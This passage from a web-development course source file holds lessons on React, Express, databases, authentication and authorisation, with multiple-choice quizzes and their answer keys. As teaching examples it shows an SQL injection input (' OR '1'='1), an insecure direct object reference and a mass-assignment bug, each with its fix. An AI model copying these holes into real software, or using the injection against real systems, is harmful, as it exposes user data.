  return <ul>{courses.map(c => <li key={c.id}>{c.title}</li>)}</ul>;
}
\`\`\`

### The dependency array decides when it runs

\`\`\`jsx
useEffect(() => { ... });            // after every render — rarely right
useEffect(() => { ... }, []);        // once, on mount
useEffect(() => { ... }, [courseId]);// on mount and whenever courseId changes
\`\`\`

Every value from component scope that the effect uses belongs in that array. Leaving one out means the effect runs with stale data. The \`react-hooks/exhaustive-deps\` lint rule catches this — listen to it.

### Cleanup prevents real bugs

The returned function runs before the next effect and on unmount. The \`cancelled\` flag above stops a slow response from calling \`setState\` on a component the user has already navigated away from — which otherwise leaks memory and can overwrite fresher data.

Timers and listeners need the same treatment:

\`\`\`jsx
useEffect(() => {
  const id = setInterval(tick, 1000);
  return () => clearInterval(id);
}, []);
\`\`\`

Without that \`clearInterval\`, every mount adds another timer that never stops.

### Three states, always

Real data has three outcomes: loading, error, and success. Handling only success produces the blank screen users report as "the site is broken". Model all three from the start — it is far harder to retrofit.
        `,
        [
          q('useEffect(() => {...}, [courseId]) runs when?', [
            'After every render',
            'Only once, when the component unmounts',
            'On mount, and again whenever courseId changes',
            'Only when courseId becomes undefined',
          ], 2, 'A dependency array re-runs the effect on mount and on any render where a listed value changed.'),
          q('What is the cancelled flag in the fetch effect protecting you from?', [
            'A late response setting state on a component the user already left',
            'Fetch requests being sent twice',
            'The JSON body being parsed incorrectly',
            'React batching two state updates into one render',
          ], 0, 'Cleanup flips the flag so a slow response cannot write stale data into an unmounted or already-updated component.'),
          q('Which set of states should a data-fetching component model?', [
            'Loading and success',
            'Success and error',
            'Idle and ready',
            'Loading, error, and success',
          ], 3, 'Handling only success is what produces the blank screen users report as a broken site.'),
        ]),
        lesson('Routing and Shared State', 14, `
A single-page app ships one HTML file and many screens. React Router is what maps the URL to the screen; Context is what stops the data those screens share from being threaded through every component in between.

### Declare the routes once

\`\`\`jsx
import { BrowserRouter, Routes, Route, Link } from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <nav><Link to="/">Home</Link> <Link to="/courses">Courses</Link></nav>

      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/courses" element={<CourseList />} />
        <Route path="/courses/:slug" element={<CourseOutline />} />
        <Route path="*" element={<NotFound />} />
      </Routes>
    </BrowserRouter>
  );
}
\`\`\`

\`path="*"\` is your in-app 404, and it is the client-side twin of the server catch-all in Chapter 5: the server hands back \`index.html\` for every path, and React decides that \`/nonsense\` has no screen.

### Link, never a plain anchor

\`\`\`jsx
<a href="/courses">Courses</a>       // full page load: state gone, bundle re-parsed
<Link to="/courses">Courses</Link>   // swaps the component, keeps everything else
\`\`\`

An anchor makes the browser throw the whole application away and start again, losing state, scroll position, and any request in flight. Keep \`<a>\` for links that genuinely leave your site.

### Reading the URL

\`\`\`jsx
function CourseOutline() {
  const { slug } = useParams();
  const navigate = useNavigate();

  useEffect(() => { load(slug); }, [slug]);   // slug is a real dependency

  return <button onClick={() => navigate('/courses')}>Back to catalogue</button>;
}
\`\`\`

Treat the URL as state you get for free: it survives a refresh, it can be bookmarked, and it can be pasted to a colleague. Storing the open tab in \`?tab=outline\` rather than \`useState\` buys all three.

The common mistake is fetching in an effect with \`[]\` in a component that reads a param. Navigating from \`/courses/react\` to \`/courses/node\` re-uses the same component instance, so a new slug arrives, no refetch happens, and the previous course sits there looking correct.

### Context for what everything needs

Threading \`user\` through four components that never read it is prop drilling.

\`\`\`jsx
const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const value = useMemo(() => ({ user, setUser }), [user]);

  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

export const useAuth = () => useContext(AuthContext);
\`\`\`

Any component at any depth can now call \`const { user } = useAuth()\`.

That \`useMemo\` is not decoration. Written as \`value={{ user, setUser }}\`, the object literal is brand new on every render of the provider, so — by the reference rule from Chapter 2 — every consumer in the tree re-renders whether the user changed or not.

### Guarding a route

\`\`\`jsx
function RequireAuth({ children }) {
  const { user } = useAuth();
  const location = useLocation();

  if (!user) return <Navigate to="/login" state={{ from: location }} replace />;
  return children;
}

<Route path="/dashboard" element={<RequireAuth><Dashboard /></RequireAuth>} />
\`\`\`

\`replace\` keeps the guarded URL out of history so Back does not bounce the user between login and the page they cannot see, and carrying \`location\` lets the login screen return them to where they were heading.

Say the important part plainly: this guard is user experience, not security. Anyone can open DevTools and set \`user\`. The server must reject the request as well.

### Context is not a state manager

Every consumer re-renders when the value changes, so a context holding something that updates on each keystroke re-renders half the app. Keep it for data that is genuinely global and changes rarely — the signed-in user, the theme, the language. Server data belongs in a cache, and form state belongs in the form.
        `,
        [
          q('Why use <Link to="/courses"> instead of <a href="/courses"> for an internal link?', [
            'An anchor cannot pass route parameters',
            'An anchor triggers a full page load, discarding app state and re-parsing the bundle',
            'React Router blocks anchors at runtime',
            'Anchors are not keyboard accessible',
          ], 1, 'Link swaps the rendered component in place, while an anchor restarts the entire application.'),
          q('A route is declared as path="/courses/:slug". How does the component read the slug?', [
            'From props.slug, passed automatically',
            'From useSearchParams()',
            'From useLocation().slug',
            'From useParams()',
          ], 3, 'useParams returns the dynamic segments matched by the route pattern.'),
          q('Why wrap the context value in useMemo?', [
            'A fresh object literal on each render makes every consumer re-render',
            'useMemo is required before a value can be passed to a Provider',
            'It stops the provider itself from re-rendering',
            'It caches the value across page reloads',
          ], 0, 'Consumers compare the context value by reference, so a new object each render defeats every optimisation below it.'),
        ]),
      ],
      [
        q('Why should a list key be a stable id rather than the array index?', [
          'Indexes are slower to compare',
          'Inserting at the front shifts every index, so React loses element state',
          'React forbids numeric keys',
          'Indexes break the map() return value',
        ], 1, 'With index keys, an insertion renumbers everything and React mismatches DOM nodes — losing input values and focus.'),
        q('setItems(items) after items.push(x) fails to re-render. Why?', [
          'push returns undefined',
          'The array reference is unchanged, so React sees no change',
          'State updates only accept objects',
          'push is asynchronous',
        ], 1, 'React compares by reference. Mutating in place keeps the same reference, so the update is skipped.'),
        q('Which correctly increments twice in one handler?', [
          'setCount(count+1); setCount(count+1);',
          'setCount(c => c+1); setCount(c => c+1);',
          'count = count + 2;',
          'setCount(count++); setCount(count++);',
        ], 1, 'The functional form receives the latest value; the plain form captures one stale value for both calls.'),
        q('What does returning a function from useEffect do?', [
          'Provides the value for the next render',
          'Registers cleanup that runs before the next effect and on unmount',
          'Makes the effect synchronous',
          'Cancels the component render',
        ], 1, 'It is the cleanup function — clear timers, unsubscribe, and cancel in-flight requests there.'),
      ]
    ),
    chapter(
      'Servers, APIs, and Node',
      'The back end: routing, REST design, validation, and honest error handling.',
      [
        lesson('Node and the Module System', 11, `
Node is JavaScript running outside the browser. There is no \`window\` and no DOM; instead you get the filesystem, network sockets, processes, and environment variables.

### Two module systems

\`\`\`js
// ES Modules — the modern default. Requires "type": "module" in package.json
import express from 'express';
export const helper = () => {};
export default router;

// CommonJS — the older style, still everywhere
const express = require('express');
module.exports = router;
\`\`\`

Pick one per project. Mixing them causes confusing failures. This course uses ES Modules, which is what \`"type": "module"\` in \`package.json\` switches on.

### package.json is the contract

\`\`\`json
{
  "name": "server",
  "type": "module",
  "scripts": {
    "dev": "nodemon src/server.js",
    "start": "node src/server.js"
  },
  "dependencies": { "express": "^4.19.2" },
  "devDependencies": { "nodemon": "^3.1.0" }
}
\`\`\`

- \`dependencies\` — needed to *run* in production.
- \`devDependencies\` — needed only to develop and build.
- The \`^\` allows compatible updates; \`package-lock.json\` pins the exact tree so every machine installs the same thing.

### Configuration through the environment

Never hardcode secrets. Read them from the environment:

\`\`\`js
import dotenv from 'dotenv';
dotenv.config();

const PORT = process.env.PORT || 5000;
const dbUrl = process.env.DATABASE_URL;
\`\`\`

Keep real values in \`.env\`, add \`.env\` to \`.gitignore\`, and commit a \`.env.example\` listing the *names* with dummy values. A secret pushed to a repository must be treated as compromised and rotated — deleting the commit is not enough, because the history persists in clones.

### Everything is async

Node's whole design assumes you never block the single thread:

\`\`\`js
import { readFile } from 'fs/promises';
const text = await readFile('./notes.md', 'utf8');
\`\`\`

Synchronous variants (\`readFileSync\`) exist, but a blocked thread means *every* pending request stalls. Use them only at startup, never while serving traffic.
        `,
        [
          q('What does "type": "module" in package.json switch on?', [
            'TypeScript compilation',
            'ES module syntax — import and export — for the project files',
            'Automatic reloading on file change',
            'Strict mode for CommonJS requires',
          ], 1, 'It tells Node to treat .js files as ES modules rather than CommonJS.'),
          q('Which package belongs in devDependencies rather than dependencies?', [
            'express',
            'dotenv',
            'nodemon',
            'bcryptjs',
          ], 2, 'nodemon only watches files while you develop; production runs plain node and never needs it.'),
          q('Why avoid readFileSync while the server is handling traffic?', [
            'It blocks the single thread, so every pending request stalls behind it',
            'It cannot read UTF-8 files',
            'It is unavailable when "type": "module" is set',
            'It bypasses the filesystem cache',
          ], 0, 'Node serves everything on one thread, so a synchronous read freezes all in-flight requests, not just yours.'),
        ]),
        lesson('REST APIs with Express', 14, `
Express turns the raw request/response cycle from Chapter 1 into something you can compose.

\`\`\`js
import express from 'express';

const app = express();
app.use(express.json());          // parse JSON request bodies

app.get('/health', (req, res) => res.json({ ok: true }));

app.listen(5000, () => console.log('listening on 5000'));
\`\`\`

### Middleware is a pipeline

Every request flows through your middleware in the order you registered it. Each one can inspect, modify, respond, or pass along with \`next()\`:

\`\`\`js
app.use((req, res, next) => {
  console.log(\`\${req.method} \${req.path}\`);
  next();                          // forget this and the request hangs forever
});
\`\`\`

That ordering matters: \`express.json()\` must come *before* any route that reads \`req.body\`, or the body will be undefined.

### Designing routes around resources

REST means URLs name **things**, and the HTTP method says what you are doing to them:

| Method + path | Purpose |
|---|---|
| \`GET /api/courses\` | List courses |
| \`GET /api/courses/:slug\` | One course |
| \`POST /api/courses\` | Create |
| \`PATCH /api/courses/:id\` | Partially update |
| \`DELETE /api/courses/:id\` | Remove |

Avoid verbs in paths — \`POST /api/getCourses\` fights the whole convention. The method already carries the verb.

### Reading input

\`\`\`js
app.get('/api/courses/:slug', (req, res) => {
  const { slug } = req.params;            // path segment
  const { page = 1 } = req.query;         // ?page=2
  // req.body for POST/PATCH payloads
});
\`\`\`

### Routers keep files small

\`\`\`js
// routes/courses.routes.js
import { Router } from 'express';
const router = Router();
router.get('/', listCourses);
router.post('/:slug/enroll', enroll);
export default router;

// server.js
app.use('/api/courses', coursesRouter);
\`\`\`

Paths inside the router are relative to where it is mounted, so \`router.get('/')\` serves \`/api/courses\`.

### Security basics that cost one line each

\`\`\`js
import helmet from 'helmet';
import cors from 'cors';
import rateLimit from 'express-rate-limit';

app.use(helmet());                                  // sensible security headers
app.use(cors({ origin: 'https://yoursite.com' }));  // who may call you
app.use('/api/', rateLimit({ windowMs: 60_000, max: 60 }));
\`\`\`

Rate limiting matters most on anything that writes or authenticates — without it, a login endpoint is an open invitation to credential stuffing.
        `,
        [
          q('A middleware logs the request but never calls next() and never responds. What happens?', [
            'Express calls next() for you after the function returns',
            'The next middleware runs anyway',
            'Express returns a 500',
            'The request hangs until the client times out',
          ], 3, 'Nothing advances the pipeline and nothing sends a response, so the connection just sits open.'),
          q('Which route follows REST conventions for creating a course?', [
            'POST /api/createCourse',
            'GET /api/courses/create',
            'POST /api/courses',
            'PUT /api/courses/new',
          ], 2, 'The path names the resource and the method supplies the verb, so no verb belongs in the URL.'),
          q('With app.use("/api/courses", coursesRouter), which URL does router.get("/") serve?', [
            '/api/courses',
            '/',
            '/courses',
            '/api',
          ], 0, 'Paths inside a router are relative to its mount point, so "/" resolves to the mount path itself.'),
        ]),
        lesson('Validation, Errors, and Status Codes', 13, `
**Never trust input.** Client-side validation is a convenience for honest users; anyone can bypass it with \`curl\`. The server is the only place validation actually counts.

### Validate at the edge

\`\`\`js
import Joi from 'joi';

const registrationSchema = Joi.object({
  name: Joi.string().min(2).max(100).required(),
  email: Joi.string().email().required(),
  phone: Joi.string().allow('', null),
});

app.post('/api/register', (req, res) => {
  const { error, value } = registrationSchema.validate(req.body, {
    abortEarly: false,      // report every problem, not just the first
    stripUnknown: true,     // silently drop fields you did not ask for
  });

  if (error) {
    return res.status(400).json({ message: 'Validation failed', errors: error.details });
  }

  // \`value\` is now clean, typed, and safe to store
});
\`\`\`

\`stripUnknown\` is quietly important: it stops a caller sneaking \`{ role: "admin" }\` into a payload and having it written straight to your database.

### Return the status code that tells the truth

\`\`\`js
res.status(200).json(data);      // fetched
res.status(201).json(created);   // created — include the new resource
res.status(400)                  // malformed or invalid input
res.status(401)                  // not authenticated — who are you?
res.status(403)                  // authenticated but not allowed
res.status(404)                  // no such resource
res.status(409)                  // conflict, e.g. email already registered
res.status(500)                  // we broke
\`\`\`

The 401/403 distinction trips people up: 401 means "log in", 403 means "you are logged in and still may not do this".

### Centralise error handling

An error handler is the one middleware with four arguments:

\`\`\`js
app.use((err, req, res, next) => {
  console.error(err);                        // full detail in your logs
  res.status(err.status || 500).json({
    message: err.expose ? err.message : 'Internal server error',
  });
});
\`\`\`

Register it **last**, after all routes.

### Never leak internals

\`\`\`js
// Dangerous — exposes file paths, library versions, sometimes credentials
res.status(500).json({ error: err.stack });

// Safe — detail to the logs, a generic message to the caller
console.error(err);
res.status(500).json({ message: 'Internal server error' });
\`\`\`

Stack traces are a reconnaissance gift to an attacker. Log them where you can read them; send the user something useful and vague.

### Async route errors

In Express 4, a rejected promise inside an async handler is **not** caught automatically:

\`\`\`js
app.get('/api/thing', async (req, res, next) => {
  try {
    res.json(await loadThing());
  } catch (err) {
    next(err);        // hand it to the error handler
  }
});
\`\`\`

Forget the try/catch and the request hangs until it times out.
        `,
        [
          q('What does abortEarly: false change about Joi validation?', [
            'It stops at the first error instead of continuing',
            'It strips keys the schema does not declare',
            'It throws instead of returning an error object',
            'It reports every validation problem, not just the first',
          ], 3, 'Collecting all failures lets you show the user every bad field in one response instead of one per submit.'),
          q('How does Express recognise an error-handling middleware?', [
            'By the name errorHandler',
            'By being registered with app.error()',
            'By taking four arguments: (err, req, res, next)',
            'By returning a status code',
          ], 2, 'The four-argument signature is the only thing that marks it as an error handler, and it must be registered last.'),
          q('An async Express 4 handler rejects and you never call next(err). What happens?', [
            'Express catches it and returns 500 automatically',
            'The request hangs until it times out',
            'The Node process exits',
            'The centralised error handler runs anyway',
          ], 1, 'Express 4 does not catch rejected promises, so nothing responds and nothing reaches the error handler.'),
        ]),
        lesson('Structuring a Server That Grows', 13, `
A route file that opens with \`express\` and ends with SQL is perfectly fine at four endpoints. At forty it becomes the file nobody volunteers to touch. The fix is not folders for their own sake — it is deciding once which layer each kind of decision belongs to.

### Four layers, one job each

| Layer | Knows about | Never touches |
|---|---|---|
| Route | Paths, methods, which middleware runs | Business rules |
| Controller | \`req\` and \`res\`, status codes, validation | SQL |
| Service | The rules of your domain | HTTP |
| Repository | Tables, columns, queries | \`req\`, \`res\` |

\`\`\`
src/
  routes/courses.routes.js
  controllers/courses.controller.js
  services/enrolment.service.js
  repositories/enrolment.repo.js
  middleware/requireAuth.js
  config.js
\`\`\`

The test for where something belongs is one question: **could a second caller need this?** Enrolments also get created by an admin import script and a nightly job. If the rule "a learner may not enrol twice" lives in the controller, it applies only to people arriving over HTTP, and the script quietly writes duplicates.

\`\`\`js
// services/enrolment.service.js — no req, no res, no status codes
export async function enrol(userId, slug) {
  const course = await courses.findBySlug(slug);
  if (!course) throw new HttpError(404, 'Course not found');

  if (await enrolments.exists(userId, course.id)) {
    throw new HttpError(409, 'Already enrolled');
  }
  return enrolments.create(userId, course.id);
}

// controllers/courses.controller.js — translates the domain into HTTP
export const enrolHandler = asyncHandler(async (req, res) => {
  const enrolment = await enrol(req.user.sub, req.params.slug);
  res.status(201).json(enrolment);
});
\`\`\`

A typed error keeps status codes out of the domain while still letting the central error handler choose the right one.

### asyncHandler, so you stop writing try/catch

\`\`\`js
export const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);
\`\`\`

Three lines that remove the most common Express 4 bug there is: forget a single try/catch and the request hangs until the client gives up. Wrap every async handler and every rejection reaches your error middleware on its own.

### Validate the environment at boot, not at 2am

\`\`\`js
// config.js
const required = ['DATABASE_URL', 'JWT_SECRET'];
const missing = required.filter((key) => !process.env[key]);

if (missing.length) {
  throw new Error(\`Missing environment variables: \${missing.join(', ')}\`);
}

export const config = {
  port: Number(process.env.PORT) || 5000,
  jwtSecret: process.env.JWT_SECRET,
  isProd: process.env.NODE_ENV === 'production',
};
\`\`\`

Import \`config\` everywhere instead of reading \`process.env\` in twenty files. A missing secret then fails the deploy immediately and loudly, rather than throwing a 500 on the first login hours later — and the list of what the app needs lives in one readable place.

### Assemble in one place

\`\`\`js
app.use(express.json());
app.use('/api/courses', coursesRouter);
app.use('/api/auth', authRouter);

app.use((req, res) => res.status(404).json({ message: 'Not found' }));   // unmatched paths
app.use(errorHandler);                                                   // last, always
\`\`\`

Order still decides everything: parsers, then routers, then the 404, then the error handler. Registered above the routers, that 404 answers every request in the application.

### Do not over-build

Three routes do not need four layers, and you will spend longer moving between files than writing code. Start with routes and repositories; split a service out the first time a rule needs a second caller. Structure should follow the pain, not anticipate it.
        `,
        [
          q('What does asyncHandler do?', [
            'Retries the handler once if it rejects',
            'Forwards a rejected promise to next(), so the error middleware handles it',
            'Converts the handler into a synchronous function',
            'Validates req.body before the handler runs',
          ], 1, 'It wraps the call in Promise.resolve and pipes any rejection into next, which is what Express 4 will not do for you.'),
          q('Why check for missing environment variables in config.js at startup?', [
            'It makes the first request faster',
            'Node cannot read process.env after startup',
            'The process fails to start instead of throwing a 500 on the first request that needs the value',
            'It encrypts the values before use',
          ], 2, 'Failing at boot turns a silent runtime outage into an obvious deploy failure.'),
          q('Where does the rule "a learner may not enrol twice" belong?', [
            'In the route file, next to the path',
            'In the repository, beside the SQL',
            'In the React form that submits the enrolment',
            'In the service, so every caller shares one copy of it',
          ], 3, 'A rule in the service applies to the HTTP handler, the import script, and the nightly job alike.'),
        ]),
      ],
      [
        q('Why must express.json() be registered before routes that read req.body?', [
          'It sets the response content type',
          'Middleware runs in registration order, so the body is unparsed before it',
          'It creates the router',
          'It is required for GET requests',
        ], 1, 'Middleware is an ordered pipeline. Register the parser after the route and req.body is undefined.'),
        q('A logged-in user requests something they lack permission for. Correct status?', [
          '400', '401', '403', '404',
        ], 2, '401 means "authenticate". 403 means "authenticated, still not allowed".'),
        q('What does Joi stripUnknown: true protect against?', [
          'SQL injection in query strings',
          'Callers injecting extra fields such as role: "admin"',
          'Requests larger than 1MB',
          'Cross-origin requests',
        ], 1, 'It discards fields the schema does not declare, so unexpected keys never reach your database.'),
        q('Why not return err.stack to the client on a 500?', [
          'It is too large to send',
          'It leaks file paths and internals useful to an attacker',
          'Express forbids it',
          'It breaks JSON parsing',
        ], 1, 'Log the stack server-side; send a generic message. Traces are reconnaissance material.'),
      ]
    ),
    chapter(
      'Data, Auth, and Deployment',
      'Persisting data, authenticating users safely, and getting the whole thing online.',
      [
        lesson('Modelling and Storing Data', 13, `
Before choosing a database, decide what you are storing and how you will read it back.

### Relational vs document

**Relational** (PostgreSQL, MySQL, SQLite) stores rows in tables with a fixed schema and links them with foreign keys. Strong guarantees, excellent for data with real relationships — which is most business data.

**Document** (MongoDB) stores flexible JSON-like documents. Easy to start, good when the shape genuinely varies.

The honest default for an application like this one is relational. Courses have chapters, chapters have lessons, users have enrolments — that *is* a relational model, and pretending otherwise means reimplementing joins in application code.

### Model the relationships

\`\`\`sql
CREATE TABLE courses (
  id    INTEGER PRIMARY KEY,
  slug  TEXT NOT NULL UNIQUE,
  title TEXT NOT NULL
);

CREATE TABLE chapters (
  id       INTEGER PRIMARY KEY,
  courseId INTEGER NOT NULL REFERENCES courses(id) ON DELETE CASCADE,
  position INTEGER NOT NULL,
  title    TEXT NOT NULL
);
\`\`\`

\`REFERENCES\` makes it impossible to create a chapter pointing at a course that does not exist. \`ON DELETE CASCADE\` removes the chapters when the course goes. Let the database enforce what the database can enforce — application code forgets, constraints do not.

### Constraints are free correctness

\`\`\`sql
email TEXT NOT NULL UNIQUE          -- no duplicate accounts, ever
UNIQUE (userId, courseId)           -- cannot enrol twice
NOT NULL                            -- required means required
\`\`\`

A \`UNIQUE\` constraint holds even when two requests race each other. An application-level "check then insert" does not — between the check and the insert, another request slips in.

### Index what you filter on

\`\`\`sql
CREATE INDEX idx_progress_user ON lesson_progress (userId, lessonId);
\`\`\`

Without an index, finding a row means scanning every row. With one, it is a lookup. Index the columns in your \`WHERE\` and \`JOIN\` clauses — and no more, since each index costs write speed and disk.

### Always use parameters

\`\`\`js
// Catastrophic — string concatenation is SQL injection
db.prepare(\`SELECT * FROM users WHERE email = '\${email}'\`);

// Correct — the driver escapes it for you
db.prepare('SELECT * FROM users WHERE email = ?').get(email);
\`\`\`

An email of \`' OR '1'='1\` turns the first query into "return every user". Parameterised queries send the value separately from the statement, so it can never be read as SQL. There is no situation where concatenation is worth it.
        `,
        [
          q('Why is a UNIQUE constraint safer than checking for a duplicate email in application code?', [
            'It runs faster than a SELECT',
            'It holds even when two requests race between the check and the insert',
            'It automatically returns a 409 to the client',
            'It removes the need for an index',
          ], 1, 'Two concurrent requests can both pass an application-level check; the database constraint cannot be raced.'),
          q('Why not add an index to every column?', [
            'Indexes are limited to one per table',
            'Indexes only work on integer columns',
            'Each index costs write speed and disk space',
            'Indexes prevent the use of foreign keys',
          ], 2, 'An index has to be maintained on every insert and update, so unused indexes are pure overhead.'),
          q("An email field containing ' OR '1'='1 is concatenated into a query string. What is the result?", [
            'The query returns no rows',
            'The query returns every user in the table',
            'The driver escapes it automatically',
            'SQLite rejects the statement as malformed',
          ], 1, 'The value becomes part of the statement and the always-true condition matches every row, which is why parameters are mandatory.'),
        ]),
        lesson('Authentication with Hashed Passwords and Tokens', 15, `
Authentication is the area where a mistake is most expensive, and the rules are refreshingly short.

### Never store a password

Store a **hash** — a one-way transformation that cannot be reversed.

\`\`\`js
import bcrypt from 'bcryptjs';

// On signup
const passwordHash = await bcrypt.hash(password, 10);

// On login
const ok = await bcrypt.compare(password, user.passwordHash);
\`\`\`

bcrypt is deliberately *slow* and salts every hash automatically. Slowness is the feature: it makes brute-forcing a stolen database impractical. Never use MD5 or SHA-1 for passwords — they are fast, which is exactly wrong here.

The \`10\` is the cost factor. Higher is slower and safer; 10–12 is the usual range.

### Tokens carry identity across requests

Because HTTP is stateless (Chapter 1), the client must prove who it is on every request. A JWT is a signed statement of identity:

\`\`\`js
import jwt from 'jsonwebtoken';

const token = jwt.sign({ sub: user.id }, process.env.JWT_SECRET, { expiresIn: '7d' });

// Verifying on later requests
const payload = jwt.verify(token, process.env.JWT_SECRET);   // throws if tampered
\`\`\`

A JWT is **signed, not encrypted**. Anyone can decode and read the payload — so never put anything secret in it. It carries an id, not a password.

### Guarding routes

\`\`\`js
export const requireAuth = (req, res, next) => {
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ message: 'Authentication required' });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    return res.status(401).json({ message: 'Invalid or expired token' });
  }
};

app.get('/api/my-courses', requireAuth, listMyCourses);
\`\`\`

### The rules worth memorising

1. Hash with bcrypt or argon2. Never store, log, or email a plain password.
2. Keep \`JWT_SECRET\` in the environment, long and random. A leaked secret lets anyone mint valid tokens for any account.
3. Give tokens an expiry.
4. **Say the same thing for a wrong email and a wrong password** — "Invalid email or password". Distinguishing them tells an attacker which accounts exist.
5. Rate-limit login endpoints.
6. Enforce authorisation separately: a valid token proves *who*, not *what they may do*. Always confirm the resource belongs to \`req.user\`.
7. Serve everything over HTTPS. A token on an unencrypted connection is a password in transit.
        `,
        [
          q('What does the 10 in bcrypt.hash(password, 10) control?', [
            'The length of the resulting hash',
            'How much work each hash takes, and therefore how slow brute force is',
            'How many characters of the password are used',
            'How many days the hash stays valid',
          ], 1, 'It is the cost factor; raising it makes both hashing and offline guessing exponentially more expensive.'),
          q('requireAuth verified the token successfully. What still has to happen before returning an enrolment?', [
            'Nothing — a valid token is sufficient',
            'The token must be re-signed with a new expiry',
            'The password must be re-checked',
            'The record must be confirmed to belong to req.user',
          ], 3, 'A token proves identity, not permission, so ownership is a separate check on every protected resource.'),
          q('What can somebody do with a leaked JWT_SECRET?', [
            'Mint valid tokens for any account without knowing a password',
            'Decode the payload, which is otherwise unreadable',
            'Nothing, because tokens still expire',
            'Read the password hashes stored in the database',
          ], 0, 'The secret is what makes a signature trustworthy, so anyone holding it can forge identity at will.'),
        ]),
        lesson('Shipping to Production', 12, `
Working locally and working in production differ in a handful of predictable ways. Handle them deliberately.

### Build the client, serve it from the API

In development you run two servers: React on 3000, the API on 5000. In production you build the React app to static files and let the API serve them, so everything is one origin:

\`\`\`js
if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, '../../client/build')));

  app.get('*', (req, res) =>
    res.sendFile(path.join(__dirname, '../../client/build/index.html'))
  );
}
\`\`\`

That catch-all matters for client-side routing: a hard refresh on \`/courses\` must return \`index.html\` so React Router can handle the path. Register it **after** your API routes, or it will swallow them.

Same-origin serving also makes CORS mostly disappear, and lets the client use relative URLs like \`/api/courses\`.

### Configure by environment, not by edit

\`\`\`js
const API_BASE = process.env.REACT_APP_API_BASE_URL ||
  (process.env.NODE_ENV === 'production' ? '' : 'http://localhost:5000');
\`\`\`

The same build should run anywhere, driven by environment variables. Never ship a code change just to point at a different server.

### A pre-launch checklist

- Secrets in environment variables; \`.env\` git-ignored and never committed.
- \`NODE_ENV=production\` set.
- HTTPS everywhere.
- \`helmet()\`, CORS restricted to your real domain, rate limiting on writes and auth.
- Every input validated server-side.
- Generic error messages out, full detail in logs.
- Database backed up on a schedule — and a restore actually tested. An untested backup is a hope, not a backup.
- Health endpoint for your host to poll.

### Watch it after launch

Shipping is the start. Track error rates, response times, and failed logins. A quiet 500 that only fires for one signup path can run for weeks unnoticed — until you look at the logs and find it has been failing since launch.

### Where to go next

You now have the full stack: markup, styling, interactive UI, HTTP API, validation, persistence, auth, and deployment. The natural next steps are automated testing, TypeScript for type safety across the boundary, and CI/CD so deployments become routine rather than an event.
        `,
        [
          q('Why does the production server return index.html for any unmatched path?', [
            'To avoid serving static files from disk',
            'To redirect users to the home page',
            'So a hard refresh on a client route still loads the app and React Router resolves the path',
            'Because Express cannot return 404 for HTML requests',
          ], 2, 'The server has no /courses route; the app itself owns that path once index.html boots.'),
          q('What should decide which API base URL a build talks to?', [
            'A constant edited before each deploy',
            'An environment variable read at runtime',
            'The browser user agent',
            'A separate git branch per environment',
          ], 1, 'One artefact should run anywhere, so shipping a code change just to point at another server is a smell.'),
          q('What turns a scheduled database dump into an actual backup?', [
            'Storing it on the same host as the database',
            'Encrypting it',
            'Keeping at least seven copies',
            'Having tested a restore from it',
          ], 3, 'An untested backup is a hope; the restore is the part that either works or does not.'),
        ]),
        lesson('Authorisation: Who May Do What', 13, `
Authentication answers *who are you*. Authorisation answers *what may you do*. The previous lesson ended with a verified token, and every question after that point is a separate one. The gap between the two is where the most commonly reported vulnerability class in web applications lives.

### The bug that ships everywhere

\`\`\`js
// requireAuth passed, so the caller is definitely somebody.
// It does not prove they are THIS somebody.
router.get('/enrolments/:id', requireAuth, async (req, res) => {
  res.json(await repo.getEnrolment(req.params.id));
});
\`\`\`

Change the \`41\` in \`/api/enrolments/41\` to \`42\` and you are reading another learner's record. This is an **insecure direct object reference**, and it stays invisible during normal testing because the interface only ever links you to your own ids.

The durable fix is not an \`if\` after the query. It is putting the owner *in* the query:

\`\`\`js
const row = await repo.getEnrolmentForUser(req.params.id, req.user.sub);
if (!row) return res.status(404).json({ message: 'Not found' });
res.json(row);
\`\`\`

\`\`\`sql
SELECT * FROM enrolments WHERE id = ? AND userId = ?;
\`\`\`

An ownership check you cannot forget beats one you have to remember. Apply it to updates and deletes too — a PATCH that only matches on id is the same bug with worse consequences.

### Roles, for when ownership is not the question

\`\`\`js
export const requireRole = (...roles) => (req, res, next) =>
  roles.includes(req.user.role)
    ? next()
    : res.status(403).json({ message: 'Forbidden' });

router.delete('/courses/:id', requireAuth, requireRole('admin'), removeCourse);
\`\`\`

The role must come from the user record the token identifies — never from the request body, a query parameter, or any header the client controls. Sending \`{ "role": "admin" }\` in a payload is the oldest privilege escalation there is, and it is exactly what \`stripUnknown\` in Chapter 4 was defending against.

### Mass assignment

\`\`\`js
// Anything the caller sends is written. Including role, isVerified, and credits.
await repo.updateUser(req.user.sub, req.body);

// Allowlist the fields a user may change about themselves.
const { name, bio } = req.body;
await repo.updateUser(req.user.sub, { name, bio });
\`\`\`

Spreading a request body straight into an update statement hands the caller your whole column list.

### Deny by default

Make the safe thing automatic: mount \`requireAuth\` on the router and let genuinely public routes opt out, rather than remembering to add it to each new endpoint. Then a forgotten line makes a route *too strict*, which somebody reports within a day, instead of *too open*, which nobody reports at all.

| Situation | Status |
|---|---|
| No token, or an expired one | 401 |
| Valid token, insufficient role | 403 |
| Valid token, somebody else's record | 404 — see below |

### 403 leaks, 404 does not

Answering 403 for a record that exists and 404 for one that does not tells an attacker precisely which ids are real. For anything sensitive, return 404 for both: as far as this caller is concerned, it does not exist. Keep 403 for cases where the existence of the resource is not itself a secret, such as an admin page everyone knows is there.

### Enforce it where it cannot be skipped

Hiding the Delete button from non-admins is good interface design and no security whatsoever; the endpoint is one \`curl\` away. Every rule you enforce in React has to be enforced again on the server, and the test that proves it is the one normal clicking never reaches.
        `,
        [
          q("A route reads /api/enrolments/:id behind requireAuth, and changing the id returns another learner's record. Best fix?", [
            'Use UUIDs so ids cannot be guessed',
            'Compare the id against a list of the user ids in the token',
            'Include the authenticated user id in the WHERE clause of the query',
            'Return 403 instead of 200 for unknown ids',
